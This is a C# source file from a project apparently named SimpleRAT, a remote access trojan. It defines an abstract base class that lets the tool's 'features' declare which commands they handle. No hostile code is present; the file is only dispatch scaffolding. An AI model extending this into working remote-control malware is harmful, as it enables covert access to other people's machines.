using SimpleRAT.Communication;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SimpleRAT.Features
{
    public abstract class BaseFeature
    {
        public Commands SupportedCommands { get; private set; }
        public bool CanHandle(Commands command) { return SupportedCommands.HasFlag(command); }

        protected BaseFeature(Commands command)
        {
            SupportedCommands = command;
        }

        public abstract void Handle(Context context);
    }
}
